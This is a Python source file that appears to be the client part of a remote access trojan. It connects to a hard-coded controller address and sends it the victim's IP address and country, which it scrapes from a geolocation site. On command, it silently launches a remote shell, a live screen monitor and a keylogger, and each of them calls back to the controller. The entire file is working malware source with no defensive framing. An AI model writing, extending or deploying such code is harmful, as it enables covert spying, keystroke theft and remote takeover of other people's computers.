#!/usr/bin/python3
import socket
import requests
from lxml import html
import os
import time
import subprocess

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003


class Client_Side():

    def __init__(self):
        self.host_addr = '10.0.0.7'
        self.host_port = 8082
        self.dir_path = os.path.dirname(os.path.realpath(__file__)) + "\\..\\"
        self.conn = self.Get_Secure_Connection()


    def Get_Secure_Connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host_addr, self.host_port))
        print("Successfully connected to the server")
        return s

    def Send_First_Data(self):
        req = requests.get(url="https://iplocation.com")
        tree = html.fromstring(req.content)
        ip = tree.xpath('//b[@class="ip"]/text()')
        country = tree.xpath('//span[@class="country_name"]/text()')
        data = "INFO: Client IP: " + ip[0] + " Client Country " + country[0]
        print (data)
        self.conn.send(data.encode())



    def Get_Data(self):
        c = ""
        while True:
            c = self.conn.recv(1024)
            if c:
                break
        return c.decode()

    #def Send_Current_Dir(self):
        #self.conn.send(self.dir_path[:-4].encode())


    def Panel(self):
        self.Send_First_Data()

        while True:
            c = self.Get_Data()
            if("Exit" in c):
                self.conn.send("Exited".encode())
                self.conn.close()
                break
            c = c.split(" ")
            cmd = c[0]
            port = c[1]
            if(cmd == "Shell"):
                self.Shell(port)
            elif(cmd == "Live"):
                self.Live_Screen(port)

            else:
                self.KeyLogger(port)

    def KeyLogger(self, port):
        msg = "Im in the Keylogger!"
        time.sleep(5)
        #self.conn.send("Opened".encode())
        print(msg)
        subprocess.call(self.dir_path + "Python27\\pythonw.exe " + self.dir_path + "KeyLogger\\KeyloggerClientNew.py " + str(port) + " " + self.host_addr)
        print("Done")

    def Live_Screen(self, port):
        msg = "Im in the Live Screen!"
        time.sleep(2)
        #self.conn.send("Opened".encode())
        print(msg)
        subprocess.call(self.dir_path + "Python37-32\\pythonw.exe " + self.dir_path + "new_monitor\\mon_client.py " + str(port) + " " + self.host_addr)
        print("Done")


    def Shell(self, port):
        msg = "Im in the Shell!"
        time.sleep(2)
        #self.conn.send("Opened".encode())
        print(msg)
        subprocess.call(self.dir_path + "Python37-32\\pythonw.exe " + self.dir_path + "Shell\shell_client.py " +  str(port) + " " + self.host_addr)
        print("Done")
        # create the socket object








c = Client_Side()
c.Panel()
print("Exited with exit code 0")
